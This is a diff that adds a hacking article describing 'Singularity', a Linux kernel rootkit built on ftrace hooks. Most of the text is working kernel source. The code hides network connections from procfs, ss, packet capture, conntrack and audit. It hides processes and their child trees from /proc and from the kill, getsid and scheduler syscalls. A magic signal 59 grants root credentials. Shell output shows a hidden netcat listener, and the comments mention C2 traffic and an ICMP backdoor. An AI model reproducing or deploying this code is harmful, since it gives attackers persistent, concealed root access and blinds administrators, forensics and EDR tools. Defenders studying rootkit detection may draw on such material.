@@ -1,0 +1,4880 @@
+---
+title: The Art of Staying Hidden
+author: MatheuZSecurity
+---
+|=-----------------------------------------------------------------------=|
+|=--------------------=[ The Art of Staying Hidden ]=--------------------=|
+|=-----------------------------------------------------------------------=|
+|=-------------------------=[ MatheuZSecurity ]=-------------------------=|
+|=-----------------------------------------------------------------------=|
+
+============================================================================
+                        GHOST IN THE MACHINE
+                  Haunting Ring 0: The Art of Staying Hidden
+============================================================================
+
+                    "Shall we give forensics a little work?"
+
+                       [KERNEL SPACE | USER SPACE]
+                    Linux Kernel Module Hacking 4fun
+                         From @MatheuZSecurity
+                           To real hackers <3
+
+============================================================================
+                            TABLE OF CONTENTS
+============================================================================
+
+  [0x00]  Introduction
+  [0x01]  The Tree
+  [0x02]  Ftrace Hooking Framework
+  [0x03]  A Socket Has Too Many Witnesses
+  [0x04]  Procfs Is Not Enough
+  [0x05]  Direct /proc Probes
+  [0x06]  Stat Still Rats You Out
+  [0x07]  eBPF Telemetry Evasion
+  [0x08]  io_uring Walks Around the Door
+  [0x09]  Logs Remember
+  [0x0A]  No Listening Port
+  [0x0B]  Hiding the Hooks
+  [0x0C]  Kernel State and Load Order
+  [0x0D]  Gaps
+  [0x0E]  Conclusion
+          References
+  [A]     Hook Inventory and Load Order
+
+============================================================================
+[0x00] - INTRODUCTION
+============================================================================
+
+Once hostile code owns ring 0, asking the same kernel for an honest account
+of the machine becomes a bad joke.  ps trusts procfs, ss trusts netlink,
+dmesg trusts the ring buffer.  An EDR may collect through eBPF, but the BPF
+plumbing still runs inside the thing being watched.
+
+Singularity started with a simple question: how many of those views could be
+made to lie at once?
+
+Plenty of rootkits hide one list and call it a day: the process disappears
+from /proc but answers kill(pid, 0), the socket hides from netstat but
+remains in SOCK_DIAG, the module leaves its ftrace callbacks, taint, sysfs
+objects, or physical pages behind.  Those gaps are where the fun starts.
+
+Every time I thought the hiding was done, another observation path showed
+up.  Most of them became another hook.
+
+Singularity goes after those gaps: procfs and netlink, packet capture, logs,
+BPF delivery paths, task dumps, symbol walks and memory-acquisition helpers.
+Some cuts are clean, some are ugly heuristics because the kernel does not
+always give you a clean place to lie.
+
+After the early self-defense setup, main.c combines many subsystem return
+values with ret |=. A missing symbol can leave only part of the stack
+installed. Keep that limitation in mind throughout the article; the hook
+inventory is in Appendix A.
+
+============================================================================
+[0x01] - THE TREE
+============================================================================
+
+The tree is split by observation path. Most modules handle one part of the
+kernel's interface to userland.
+
+
+  --[ Directory Structure
+
+Singularity/
+|-- ftrace/                 # Core ftrace hooking framework
+|   |-- ftrace_helper.c     # Hook installation and removal
+|   `-- ftrace_helper.h     # Hook macros and structures
+|-- include/                # Header files for all modules
+|-- modules/                # Core functionality modules
+|   |-- audit.c             # Audit message filtering
+|   |-- become_root.c       # Privilege escalation
+|   |-- bpf_hook.c          # eBPF telemetry evasion
+|   |-- clear_taint_dmesg.c # Log and diagnostic filtering
+|   |-- hidden_pids.c       # PID tracking
+|   |-- hide_module.c       # Module concealment
+|   |-- hiding_chdir.c      # chdir() blocking
+|   |-- hiding_directory.c  # Directory filtering
+|   |-- hiding_readlink.c   # readlink() blocking
+|   |-- hiding_stat.c       # stat() blocking
+|   |-- hiding_tcp.c        # Network hiding
+|   |-- hooks_write.c       # Write and forensics filtering
+|   |-- icmp.c              # ICMP backdoor
+|   |-- lkrg_bypass.c       # LKRG evasion
+|   |-- open.c              # File access blocking
+|   |-- reset_tainted.c     # One-shot taint reset helper
+|   |-- selfdefense.c       # Memory deception
+|   |-- sysrq_hook.c        # SysRq task dump filtering
+|   |-- task.c              # TaskStats protection
+|   `-- trace.c             # Process fork tracking
+`-- main.c                 # Module initialization and cleanup
+
+
+============================================================================
+[0x02] - FTRACE HOOKING FRAMEWORK
+============================================================================
+
+Most of the code below uses ftrace to redirect function entry. It does not
+write to sys_call_table or change CR0.
+
+
+  --[ Why Ftrace?
+
+The old sys_call_table route means finding a protected table, making it
+writable, and breaking an obvious invariant.  Ftrace already has a supported
+reason to redirect function entry, so it gives a better hook point and a
+larger target set than syscalls alone.
+
+
+On x86_64, gcc compiles functions with a special prefix at the beginning:
+
+    some_function:
+        call __fentry__    # <- 5 bytes hook point
+        push %rbp
+        mov %rsp, %rbp
+        ...
+
+Ftrace patches that entry site and sends control through ftrace_ops; the
+callback below changes regs->ip to the replacement.
+
+
+  --[ Hook installation
+
+[1] Symbol Resolution (resolve_sym) - ftrace_helper.c, abridged
+
+    On kernels >= 5.7, kallsyms_lookup_name is no longer exported.
+    Solution: use a temporary kprobe to get the address.
+
+    notrace unsigned long *resolve_sym(const char *symname) {
+        #ifdef KPROBE_LOOKUP
+            register_kprobe(&kp);
+            kallsyms_lookup_name_fn = (kallsyms_lookup_name_t) kp.addr;
+            unregister_kprobe(&kp);
+        #endif
+        return (unsigned long *)kallsyms_lookup_name_fn(symname);
+    }
+
+
+[2] Hook Installation (fh_install_hook) - ftrace_helper.c, abridged
+
+    int fh_install_hook(struct ftrace_hook *hook) {
+        // Resolve function address
+        fh_resolve_hook_address(hook);
+
+        // Configure ftrace_ops
+        hook->ops.func  = fh_ftrace_thunk;
+        hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS |
+                          FTRACE_OPS_FL_RECURSION |
+                          FTRACE_OPS_FL_IPMODIFY;
+
+        // Register filter and callback
+        ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+        register_ftrace_function(&hook->ops);
+    }
+
+    Flags used here:
+    - SAVE_REGS: Preserves registers for modification
+    - RECURSION: Protection against infinite loops
+    - IPMODIFY: Allows modifying instruction pointer
+
+
+[3] Thunk Function (fh_ftrace_thunk) - ftrace_helper.c
+
+    void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
+                                  struct ftrace_ops *ops, struct pt_regs
+                                      *regs) {
+        struct ftrace_hook *hook = container_of(ops, struct ftrace_hook,
+            ops);
+        #if USE_FENTRY_OFFSET
+            regs->ip = (unsigned long)hook->function;
+        #else
+            if (!within_module(parent_ip, THIS_MODULE))
+                regs->ip = (unsigned long)hook->function;
+        #endif
+    }
+
+    A compatibility landmine: USE_FENTRY_OFFSET = 0 (ftrace_helper.h)
+    Changed from 1 to 0 to prevent crashes in kernels 6.12+
+    I commented in code: "Changed to 0 (previously 1) for the simple reason
+    that it caused crashes in kernels 6.12 and others"
+
+
+[4] HOOK Macro (ftrace_helper.h)
+
+    #define HOOK(_name, _hook, _orig) \
+        { .name = (_name), .function = (_hook), .original = (_orig), }
+
+    Usage:
+    static struct ftrace_hook hooks[] = {
+        HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
+        HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
+    };
+
+
+struct ftrace_hook {
+    const char *name;           // Name of function to hook
+    void *function;             // Pointer to our hook function
+    void *original;             // Pointer to original function
+    unsigned long address;      // Resolved function address
+    struct ftrace_ops ops;      // ftrace_ops structure
+};
+
+
+  --[ Reach and limits
+
+Anything ftrace can resolve and instrument is a candidate, not just a
+syscall entry. tcp4_seq_show, tpacket_rcv and taskstats_user_cmd all fit
+behind the same small wrapper; ftrace owns the trampoline and saved-register
+bookkeeping.
+
+Performance overhead is lower than kprobes because ftrace doesn't use
+breakpoint exceptions. Kprobes patch instructions to trigger debug
+exceptions on every hit, which adds context-switch overhead. Ftrace instead
+uses NOPs that get patched into jumps to a trampoline, which is faster. That
+said, manual splicing would still be faster since it avoids ftrace's
+callback infrastructure entirely.
+
+Ftrace also tends to be more stable across kernel versions than raw syscall
+table manipulation. The syscall table has moved, gained protections, and
+changed calling conventions over the years. Ftrace's API, while not
+guaranteed stable, has maintained reasonable compatibility because the
+kernel's own tracing tools depend on it.
+
+There are hard edges: notrace functions are out, an inlined function has no
+symbol to catch, early boot and architecture-specific paths vary, and
+ftrace_ops is not a stable module ABI.  Worse, an installed ftrace hook is
+visible unless something also edits the views used to inspect ftrace.
+
+Files like /sys/kernel/tracing/enabled_functions and touched_functions will
+expose active hooks to anyone who reads them. That is why Singularity hooks
+the read paths for these files, filtering its function names from the
+output. Stack trace analysis can also detect ftrace hooks by looking for
+anomalous call frames. The hooks need to hide themselves, which adds another
+layer of complexity.
+
+
+============================================================================
+[0x03] - A SOCKET HAS TOO MANY WITNESSES
+============================================================================
+
+Hiding a connection from /proc/net/tcp still leaves SOCK_DIAG, packet
+capture, conntrack and audit. This section follows the same connection
+through those interfaces.
+
+
+  --[ procfs
+
+The first interface is /proc/net/tcp*, used by netstat.
+
+The files are seq_file output:
+
+  /proc/net/tcp   -> tcp4_seq_show()
+  /proc/net/tcp6  -> tcp6_seq_show()
+  /proc/net/udp   -> udp4_seq_show()
+  /proc/net/udp6  -> udp6_seq_show()
+
+The seq hook:
+
+From modules/hiding_tcp.c:
+
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq,
+                                             void *v);
+
+static notrace asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq,
+void *v)
+{
+    struct sock *sk = v;
+
+    if (v == SEQ_START_TOKEN || sk == (void *)1)
+        return orig_tcp4_seq_show(seq, v);
+
+    if (unlikely(!sk || (unsigned long)sk < PAGE_SIZE))
+        return orig_tcp4_seq_show(seq, v);
+
+    if (should_hide_sock(sk))
+        return 0;
+
+    return orig_tcp4_seq_show(seq, v);
+}
+
+Returning 0 for a matched socket omits that record; the IPv6 hook uses the
+same cut with ipv6_addr_equal().
+
+
+  --[ SOCK_DIAG
+
+ss does not care that /proc/net/tcp was cleaned. It asks SOCK_DIAG over
+netlink and walks around the seq_file hook completely, so the recvmsg()
+result has to be filtered too.
+
+recvmsg() is the ugly one. regs->di is an fd, so the hook resolves the
+socket first; only SOCK_DIAG and NETFILTER buffers are copied and compacted.
+
+From modules/audit.c:
+
+static notrace asmlinkage long hook_recvmsg(const struct pt_regs *regs)
+{
+    long ret;
+    int fd, err;
+    struct user_msghdr __user *umsg;
+    struct user_msghdr kmsg;
+    struct iovec iov;
+    struct socket *sock;
+    int protocol;
+    unsigned char *kbuf = NULL;
+    long new_len;
+
+    ret = orig_recvmsg(regs);
+    if (ret <= 0)
+        return ret;
+
+    // regs->di is a file descriptor, not a struct socket pointer.
+    fd = (int)regs->di;
+    umsg = (struct user_msghdr __user *)regs->si;
+
+    // Convert fd -> socket using kernel's lookup function
+    // This also increments socket's refcount (must release later!)
+    err = 0;
+    sock = sockfd_lookup(fd, &err);
+    if (!sock)
+        return ret;
+
+    if (sock->sk->sk_family != AF_NETLINK) {
+        sockfd_put(sock);  // Release refcount
+        return ret;
+    }
+
+    protocol = sock->sk->sk_protocol;
+    sockfd_put(sock);  // Done with socket, release before blocking ops
+
+    // Only care about SOCK_DIAG (ss command) and NETFILTER (conntrack)
+    if (protocol != NETLINK_SOCK_DIAG && protocol != NETLINK_NETFILTER)
+        return ret;
+
+    // Copy the msghdr structure from userspace
+    if (copy_from_user(&kmsg, umsg, sizeof(kmsg)))
+        return ret;
+
+    if (kmsg.msg_iovlen < 1 || !kmsg.msg_iov)
+        return ret;
+
+    // Get the iovec that contains actual data buffer
+    if (copy_from_user(&iov, kmsg.msg_iov, sizeof(iov)))
+        return ret;
+
+    if (!iov.iov_base || iov.iov_len == 0)
+        return ret;
+
+    // kvmalloc: tries kmalloc first, falls back to vmalloc for large
+    // buffers
+    kbuf = kvmalloc(ret, GFP_KERNEL);
+    if (!kbuf)
+        return ret;
+
+    // Copy netlink messages from userspace buffer
+    if (copy_from_user(kbuf, iov.iov_base, ret)) {
+        kvfree(kbuf);
+        return ret;
+    }
+
+    // Filter out messages about hidden connections
+    new_len = tcp_hiding_filter_netlink(protocol, kbuf, ret);
+
+    // If we removed anything, copy filtered buffer back to userspace
+    if (new_len != ret && new_len > 0) {
+        if (copy_to_user(iov.iov_base, kbuf, new_len) == 0)
+            ret = new_len;
+    }
+
+    kvfree(kbuf);
+    return ret;
+}
+
+tcp_hiding_filter_netlink() dispatches by protocol:
+
+  - NETLINK_SOCK_DIAG -> filter_sock_diag_messages()
+  - NETLINK_NETFILTER -> filter_conntrack_messages()
+
+SOCK_DIAG replies are walked as nlmsghdr records, SOCK_DIAG_BY_FAMILY
+payloads are treated as struct inet_diag_msg and handed to
+should_hide_inet_diag() and that helper hides entries whose source or
+destination port is 8081, or whose IPv4/IPv6 endpoint matches the configured
+hidden server IP.
+
+NETFILTER conntrack replies use the same nlmsghdr walk, with simpler
+matching: for NFNL_SUBSYS_CTNETLINK messages it scans the message bytes for
+the configured hidden IPv4 address. Matching messages are omitted from the
+compacted output buffer. If nothing survives, an NLMSG_DONE record is
+synthesized rather than handing userland an empty malformed stream.
+
+
+  --[ AF_PACKET
+
+Packet capture is separate from the socket listings. The hook shown here
+targets tpacket_rcv().
+
+
+static notrace int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device
+*dev,
+                                       struct packet_type *pt, struct
+                                           net_device *orig_dev)
+{
+    struct iphdr *iph;
+    struct ipv6hdr *ip6h;
+    struct tcphdr *tcph;
+    struct udphdr *udph;
+    unsigned int hdr_len;
+
+    if (unlikely(!skb || !dev || !orig_tpacket_rcv))
+        goto out;
+
+    // Drop all loopback traffic (where our C2 likely runs)
+    if (dev->name[0] == 'l' && dev->name[1] == 'o')
+        return NET_RX_DROP;
+
+    // Some packets are "non-linear" (data spread across multiple buffers)
+    // We need to linearize them to safely inspect headers
+    if (skb_is_nonlinear(skb)) {
+        if (in_hardirq() || skb_shared(skb))
+            goto out;
+        if (skb_linearize(skb))
+            goto out;
+    }
+
+    // === IPv4 Packet Handling ===
+    if (skb->protocol == htons(ETH_P_IP)) {
+        if (skb->len < sizeof(struct iphdr))
+            goto out;
+
+        iph = ip_hdr(skb);
+
+        // Check IP addresses first (fast path)
+        if (is_hidden_ipv4(iph->daddr) || is_hidden_ipv4(iph->saddr))
+            return NET_RX_DROP;
+
+        // IP header length is variable (ihl field * 4 bytes)
+        hdr_len = iph->ihl * 4;
+
+        if (iph->protocol == IPPROTO_TCP) {
+            // Validate header length before accessing TCP header
+            if (hdr_len < sizeof(struct iphdr) ||
+                skb->len < hdr_len + sizeof(struct tcphdr))
+                goto out;
+
+            tcph = (struct tcphdr *)((u8 *)iph + hdr_len);
+
+            if (is_hidden_port(ntohs(tcph->dest)) ||
+                is_hidden_port(ntohs(tcph->source)))
+                return NET_RX_DROP;
+        }
+
+        else if (iph->protocol == IPPROTO_UDP) {
+            if (hdr_len < sizeof(struct iphdr) ||
+                skb->len < hdr_len + sizeof(struct udphdr))
+                goto out;
+
+            udph = (struct udphdr *)((u8 *)iph + hdr_len);
+
+            if (is_hidden_port(ntohs(udph->dest)) ||
+                is_hidden_port(ntohs(udph->source)))
+                return NET_RX_DROP;
+        }
+    }
+
+    // === IPv6 Packet Handling ===
+    else if (skb->protocol == htons(ETH_P_IPV6)) {
+        if (skb->len < sizeof(struct ipv6hdr))
+            goto out;
+
+        ip6h = ipv6_hdr(skb);
+
+        if (is_hidden_ipv6(&ip6h->daddr) || is_hidden_ipv6(&ip6h->saddr))
+            return NET_RX_DROP;
+
+        // IPv6 base header is fixed 40 bytes
+        if (ip6h->nexthdr == IPPROTO_TCP) {
+            if (skb->len < sizeof(struct ipv6hdr) + sizeof(struct tcphdr))
+                goto out;
+
+            tcph = (struct tcphdr *)((u8 *)ip6h + sizeof(*ip6h));
+
+            if (is_hidden_port(ntohs(tcph->dest)) ||
+                is_hidden_port(ntohs(tcph->source)))
+                return NET_RX_DROP;
+        }
+
+        else if (ip6h->nexthdr == IPPROTO_UDP) {
+            if (skb->len < sizeof(struct ipv6hdr) + sizeof(struct udphdr))
+                goto out;
+
+            udph = (struct udphdr *)((u8 *)ip6h + sizeof(*ip6h));
+
+            if (is_hidden_port(ntohs(udph->dest)) ||
+                is_hidden_port(ntohs(udph->source)))
+                return NET_RX_DROP;
+        }
+    }
+
+out:
+    return orig_tpacket_rcv(skb, dev, pt, orig_dev);
+}
+
+NET_RX_DROP is returned instead of calling kfree_skb(). When a packet
+handler returns NET_RX_DROP, the kernel handles skb cleanup. Calling
+kfree_skb() directly would cause a double-free when the kernel also tries to
+free it.
+
+For traffic matching the current hidden IP/port rules, tcpdump and wireshark
+do not receive the packet through AF_PACKET because tpacket_rcv() returns
+NET_RX_DROP first.
+
+
+  --[ Conntrack
+
+Conntrack keeps state independently of the socket listings. It can be
+queried through:
+  - /proc/net/nf_conntrack
+  - netlink NETLINK_NETFILTER messages
+
+Both paths are covered, with one important limitation: conntrack filtering
+keys primarily off the configured hidden IP, not the hidden port alone.
+
+1. For /proc/net/nf_conntrack:
+   clear_taint_dmesg.c filters text read from the procfs conntrack file
+   and removes lines containing the configured hidden IPv4 address.
+
+2. For netlink:
+   recvmsg()/recvfrom() hand NETLINK_NETFILTER buffers to
+   tcp_hiding_filter_netlink(), which drops conntrack messages when the
+   hidden IPv4 address appears in the payload.
+
+This is narrower than the TCP/UDP seq hooks, which do hide by port or hidden
+IP. Conntrack hiding here is IP-driven.
+
+
+  --[ Audit
+
+Audit filtering uses a hook on netlink_unicast():
+
+static notrace int hook_netlink_unicast(struct sock *ssk, struct sk_buff
+*skb,
+                                        u32 portid, int nonblock)
+{
+    struct nlmsghdr *nlh;
+    unsigned char *payload;
+    size_t payload_len;
+
+    if (!is_audit_socket(ssk))
+        goto send_normal;
+
+    if (!is_valid_netlink_msg(skb))
+        goto send_normal;
+
+    nlh = (struct nlmsghdr *)skb->data;
+    payload = NLMSG_DATA(nlh);
+    payload_len = nlmsg_len(nlh);
+
+    if (!payload || payload_len == 0 || payload_len > 65536)
+        goto send_normal;
+
+    if (should_block_audit_msg((const char *)payload, payload_len)) {
+        consume_skb(skb);
+        return 0;
+    }
+
+send_normal:
+    return orig_netlink_unicast(ssk, skb, portid, nonblock);
+}
+
+should_block_audit_msg() checks more than a simple pid= field: it scans
+hidden process sockets into an inode denylist, suppresses hidden direct or
+child PIDs, suppresses hidden socket inode references, and suppresses audit
+payloads that mention hidden /proc/<pid> paths.
+
+
+  --[ Observed network output
+
+    bash-5.2$ nc -lvnp 8081 &
+    [1] 5087
+    bash-5.2$ Listening on 0.0.0.0 8081
+
+    bash-5.2$ ss -tulpn | grep 8081
+    bash-5.2$
+
+    bash-5.2$ ss -tapen | grep 8081
+    bash-5.2$
+
+    bash-5.2$ netstat -tulpn | grep 8081
+    bash-5.2$
+
+    bash-5.2$ sudo lsof -i :8081
+    bash-5.2$
+
+
+============================================================================
+[0x04] - PROCFS IS NOT ENOUGH
+============================================================================
+
+Removing a numeric directory from /proc leaves other ways to find the PID:
+direct path probes, scheduling syscalls, TaskStats, cgroups, BPF records and
+task dumps and coverage differs here. Directory listing follows
+hidden_pids[] and child_pids[] so most direct PID probes also recognize
+tracked descendants and thread IDs whose TGID belongs to a hidden or child
+process. Some aggregate and text paths stay narrower: sysinfo subtracts only
+hidden_pid_count(), and cgroup PID filtering only checks hidden_pids[].
+
+
+  --[ PID tracking
+
+hidden_pids[] holds explicit entries. child_pids[] follows the fork tree.
+Both arrays carry leader start_time metadata for the BPF side:
+
+// From include/hidden_pids.h and modules/hidden_pids.c
+#define MAX_HIDDEN_PIDS 32
+#define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128)
+
+extern int hidden_pids[MAX_HIDDEN_PIDS];
+extern int hidden_count;
+extern u64 hidden_start_times[MAX_HIDDEN_PIDS];
+
+extern int child_pids[MAX_CHILD_PIDS];
+extern int child_count;
+extern u64 child_start_times[MAX_CHILD_PIDS];
+
+notrace int hidden_pid_count(void);
+notrace int child_pid_count(void);
+notrace int hidden_pids_snapshot(int *dst, int max_entries);
+notrace int child_pids_snapshot(int *dst, int max_entries);
+notrace int pid_is_thread(int tid);
+
+notrace void add_child_pid(int pid) {
+    unsigned long flags;
+    int i;
+    struct task_struct *task;
+    struct task_struct *leader;
+    u64 start_time_ns = 0;
+
+    if (pid <= 0)
+        return;
+
+    rcu_read_lock();
+    task = pid_task(find_vpid(pid), PIDTYPE_PID);
+    if (task) {
+        leader = rcu_dereference(task->group_leader);
+        if (!leader)
+            leader = task;
+        start_time_ns = READ_ONCE(leader->start_time);
+    }
+    rcu_read_unlock();
+
+    spin_lock_irqsave(&hidden_pids_lock, flags);
+    for (i = 0; i < child_count; i++) {
+        if (child_pids[i] == pid) {
+            if (start_time_ns)
+                child_start_times[i] = start_time_ns;
+            goto out;
+        }
+    }
+
+    if (child_count < MAX_HIDDEN_PIDS*128) {
+        child_pids[child_count++] = pid;
+        child_start_times[child_count - 1] = start_time_ns;
+    }
+out:
+    spin_unlock_irqrestore(&hidden_pids_lock, flags);
+}
+
+notrace int is_child_pid(int pid) {
+    unsigned long flags;
+    int i, found = 0;
+
+    if (pid <= 0)
+        return 0;
+
+    spin_lock_irqsave(&hidden_pids_lock, flags);
+    for (i = 0; i < child_count; i++) {
+         if (child_pids[i] == pid) {
+             found = 1;
+             break;
+         }
+    }
+    spin_unlock_irqrestore(&hidden_pids_lock, flags);
+    return found;
+}
+
+notrace void add_hidden_pid(int pid) {
+    unsigned long flags;
+    int i;
+    struct task_struct *task;
+    struct task_struct *leader;
+    u64 start_time_ns = 0;
+
+    if (pid <= 0)
+        return;
+
+    rcu_read_lock();
+    task = pid_task(find_vpid(pid), PIDTYPE_PID);
+    if (task) {
+        leader = rcu_dereference(task->group_leader);
+        if (!leader)
+            leader = task;
+        start_time_ns = READ_ONCE(leader->start_time);
+    }
+    rcu_read_unlock();
+
+    spin_lock_irqsave(&hidden_pids_lock, flags);
+    for (i = 0; i < hidden_count; i++) {
+         if (hidden_pids[i] == pid) {
+             if (start_time_ns)
+                 hidden_start_times[i] = start_time_ns;
+             goto out;
+         }
+    }
+
+    if (hidden_count < MAX_HIDDEN_PIDS) {
+        hidden_pids[hidden_count++] = pid;
+        hidden_start_times[hidden_count - 1] = start_time_ns;
+    }
+out:
+    spin_unlock_irqrestore(&hidden_pids_lock, flags);
+}
+
+notrace int is_hidden_pid(int pid) {
+    unsigned long flags;
+    int i, found = 0;
+
+    if (pid <= 0)
+        return 0;
+
+    spin_lock_irqsave(&hidden_pids_lock, flags);
+    for (i = 0; i < hidden_count; i++) {
+         if (hidden_pids[i] == pid) {
+             found = 1;
+             break;
+         }
+    }
+    spin_unlock_irqrestore(&hidden_pids_lock, flags);
+    return found;
+}
+
+notrace int pid_is_thread(int tid) {
+    struct task_struct *task;
+    int tgid = 0;
+
+    if (tid <= 0)
+        return 0;
+
+    rcu_read_lock();
+    task = pid_task(find_vpid(tid), PIDTYPE_PID);
+    if (task)
+        tgid = task->tgid;
+    rcu_read_unlock();
+
+    if (tgid == 0 || tgid == tid)
+        return 0;
+
+    return is_hidden_pid(tgid) || is_child_pid(tgid);
+}
+
+Directory filtering checks hidden_pids[] and child_pids[]. pid_is_thread()
+handles a different case: a TID that belongs to a thread group whose TGID is
+already hidden or tracked as a child. Direct PID probes in open.c,
+hiding_stat.c, become_root.c, task.c and audit.c use that third check; the
+ordinary BPF PID helper does too. Counts and some text filters stay
+narrower, as noted below.
+
+
+  --[ Child process tracking
+
+trace.c feeds child_pids[] from sched_process_fork, with wake_up_new_task as
+a fallback:
+
+// From modules/trace.c
+
+static struct tracepoint *tp_sched_fork;
+static int (*_probe_register)(struct tracepoint *, void *, void *);
+static int (*_probe_unregister)(struct tracepoint *, void *, void *);
+
+notrace static void on_fork_handler(void *data, struct task_struct *parent,
+                                    struct task_struct *child)
+{
+    // A hidden A records child B in child_pids[].  When B forks C, the
+    // child_pids[] test keeps the chain alive.
+
+    if (is_hidden_pid(parent->pid) || is_hidden_pid(parent->tgid) ||
+        is_child_pid(parent->pid) || is_child_pid(parent->tgid)) {
+        add_child_pid(child->pid);
+        add_child_pid(child->tgid);
+    }
+}
+
+static void (*orig_wake_up_new_task)(struct task_struct *p) = NULL;
+
+static notrace void hook_wake_up_new_task(struct task_struct *p)
+{
+    if (!orig_wake_up_new_task) return;
+    if (p) {
+        pid_t ppid  = READ_ONCE(current->pid);
+        pid_t ptgid = READ_ONCE(current->tgid);
+        if (is_hidden_pid(ppid) || is_hidden_pid(ptgid) ||
+            is_child_pid(ppid)  || is_child_pid(ptgid)) {
+            add_child_pid(READ_ONCE(p->pid));
+            add_child_pid(READ_ONCE(p->tgid));
+        }
+    }
+    orig_wake_up_new_task(p);
+}
+
+static struct ftrace_hook trace_hooks[] = {
+    HOOK("wake_up_new_task", hook_wake_up_new_task, &orig_wake_up_new_task),
+};
+
+notrace int trace_pid_init(void)
+{
+    _probe_register = (void *)resolve_sym("tracepoint_probe_register");
+    _probe_unregister = (void *)resolve_sym("tracepoint_probe_unregister");
+    tp_sched_fork = (void *)resolve_sym("__tracepoint_sched_process_fork");
+
+    if (tp_sched_fork && _probe_register)
+        _probe_register(tp_sched_fork, on_fork_handler, NULL);
+
+    // wake_up_new_task ftrace hook is always installed as fallback;
+    // if the tracepoint resolved above, both paths run in parallel.
+    fh_install_hooks(trace_hooks, ARRAY_SIZE(trace_hooks));
+
+    return 0;
+}
+
+notrace void trace_pid_cleanup(void)
+{
+    if (tp_sched_fork && _probe_unregister)
+        _probe_unregister(tp_sched_fork, on_fork_handler, NULL);
+
+    fh_remove_hooks(trace_hooks, ARRAY_SIZE(trace_hooks));
+}
+
+
+  --[ Directory Listing Filtering
+
+ps starts with the numeric entries returned by getdents64().  The hook is
+short:
+
+
+static notrace asmlinkage long hook_getdents64(const struct pt_regs *regs)
+{
+    long res = orig_getdents64(regs);
+    if (res <= 0) return res;
+    return filter_dirents((void __user *)regs->si, res, true);
+}
+
+
+should_hide_name() has two cases:
+
+static notrace bool should_hide_name(const char *name)
+{
+    int i, pid;
+
+    if (!name)
+        return false;
+
+    // Check for pattern-based hiding (files/dirs)
+    for (i = 0; hidden_patterns[i] != NULL; i++) {
+        if (strstr(name, hidden_patterns[i]))
+            return true;
+    }
+
+    // Try to parse as PID
+    if (kstrtoint(name, 10, &pid) < 0)
+        return false;
+
+    // Check BOTH hidden PIDs AND child PIDs
+    if (is_hidden_pid(pid) || is_child_pid(pid))
+        return true;
+
+    return false;
+}
+
+ls /proc loses explicit PIDs, descendants, and pattern-matched directory
+entries through the same filter.
+
+  --[ Direct /proc probes
+
+Removing a PID from getdents() does not stop a direct cat
+/proc/<pid>/cmdline.  open.c therefore checks the openat(), readlinkat(),
+access(), faccessat() and faccessat2() paths.  The checks are deliberately
+narrow: they recognize an absolute /proc/<pid> path, leave the caller's own
+TGID alone, and hide an explicit PID, a tracked child PID, or a thread ID
+whose TGID belongs to either set. Section 0x05 shows the helper and compat
+coverage.
+
+
+  --[ Stat Syscall Filtering
+
+stat() does not need to open the file.  hiding_stat.c covers the path-based
+stat family and returns -ENOENT for hidden /proc/<pid> paths or names
+matching the directory filter.  Section 0x06 keeps the code and the exact
+syscall list.
+
+
+  --[ kill() Syscall Hiding
+
+A common trick to check if a PID exists:
+
+    if (kill(pid, 0) == 0)
+        // PID exists
+
+modules/become_root.c intercepts this, and the path does more than the old
+"magic signal => root" shorthand:
+
+static notrace asmlinkage long hook_kill(const struct pt_regs *regs) {
+    int pid = (int)regs->di;
+    int signal = (int)regs->si;
+
+    if (signal == 59) {
+        hide_process_tree();
+        msleep(50);
+        SpawnRoot();
+
+        if (pid > 0 && pid != current->pid) {
+            add_hidden_pid(pid);
+            add_child_pid(pid);
+        }
+
+        return 0;
+    }
+
+    if (signal == 0 && should_hide_pid_by_int(pid))
+        return -ESRCH;
+
+    if (!orig_kill)
+        return -ENOSYS;
+
+    return orig_kill(regs);
+}
+
+Signal 59 is doing several jobs at once:
+
+  - hide_process_tree() hides current->pid, current->tgid,
+      thread-group
+    members, and the current child list
+  - msleep(50) gives the hide path a small settling window before
+      post-root
+    activity fans out
+  - SpawnRoot() then swaps the current credentials to uid/gid 0 via
+    prepare_creds() + commit_creds()
+  - if the caller supplied a positive target PID different from itself, that
+    PID is also inserted into both hidden tracking paths
+
+Tools can also discover processes via getsid, getpgid, getpgrp:
+
+static notrace asmlinkage long hook_getsid(const struct pt_regs *regs)
+{
+    int pid = (int)regs->di;
+    if (should_hide_pid_by_int(pid))
+        return -ESRCH;
+    if (!orig_getsid)
+        return -ENOSYS;
+    return orig_getsid(regs);
+}
+
+static notrace asmlinkage long hook_getpgid(const struct pt_regs *regs)
+{
+    int pid = (int)regs->di;
+
+    if (pid == 0) {
+        if (!current)
+            return orig_getpgid ? orig_getpgid(regs) : -ENOSYS;
+        pid = current->tgid;
+    }
+
+    if (should_hide_pid_by_int(pid))
+        return -ENOENT;  // Note: ENOENT, not ESRCH
+
+    if (!orig_getpgid)
+        return -ENOSYS;
+
+    return orig_getpgid(regs);
+}
+
+static notrace asmlinkage long hook_getpgrp(const struct pt_regs *regs)
+{
+    if (current && should_hide_pid_by_int(current->tgid))
+        return -ENOENT;
+
+    if (!orig_getpgrp)
+        return -ENOSYS;
+
+    return orig_getpgrp(regs);
+}
+
+getsid() returns -ESRCH; getpgid() and getpgrp() return -ENOENT.  There is
+no deep POSIX argument behind the mismatch; that is what the source does.
+Both values break casual enumeration, but they do not say the same thing to
+a careful caller:
+
+  - -ESRCH semantically matches "no such process"
+  - -ENOENT semantically looks more like "thing not found"
+
+The errno mismatch is part of the current implementation.
+
+
+  --[ Scheduler Syscall Hiding
+
+Various scheduler syscalls can reveal process existence:
+  - sched_getaffinity
+  - sched_getparam
+  - sched_getscheduler
+  - sched_rr_get_interval
+
+The x64 implementations are hooked:
+
+static notrace asmlinkage long hook_sched_getaffinity(const struct pt_regs
+*regs) {
+    pid_t pid = (pid_t)regs->di;
+
+    if (should_hide_pid_by_int(pid))
+        return -ESRCH;
+
+    if (!orig_sched_getaffinity)
+        return -ENOSYS;
+
+    return orig_sched_getaffinity(regs);
+}
+
+
